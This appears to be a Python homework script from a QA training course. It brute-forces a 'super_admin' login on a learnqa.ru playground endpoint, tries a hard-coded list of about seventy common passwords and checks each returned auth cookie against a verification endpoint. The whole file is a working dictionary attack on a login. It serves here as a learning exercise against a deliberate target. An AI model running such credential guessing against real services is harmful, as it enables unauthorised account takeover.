import requests

password = ["password", "123456", "12345678", "qwerty", 'abc123', 'monkey', '1234567', 'letmein', 'trustno1', 'dragon', 'baseball', '111111', 'iloveyou', 'master', 'sunshine', 'ashley', 'bailey', 'passw0rd', 'shadow', '123123', '654321', 'superman', 'qazwsx', 'michael', 'Football', 'password1', 'qwertyuiop', 'welcome', 'football', '1234', 'princess', 'adobe123', 'login', 'admin', '1234567890', 'qwerty123', 'solo', '1q2w3e4r', '666666', 'photoshop', '1qaz2wsx', 'mustang', '121212', 'starwars', 'access', 'flower', '555555', 'shadow', '7777777', '!@#$%^&*',
'jesus', 'hello', 'charlie', '888888', '696969', 'hottie',	'freedom', 'aa123456', 'ninja',	'azerty', 'loveme',	'whatever', 'donald', 'mustang', 'batman', 'zaq1zaq1',	'000000',	'starwars', '123qwe']
for i in password:
   params = {'login': 'super_admin', 'password': i}
   response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=params)
   cookie_value = response1.cookies.get('auth_cookie')
   cookies = {'auth_cookie': cookie_value}
   response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
   if response2.text == "You are authorized":
    print(i, "- верно!")
   else:
    print('неверно')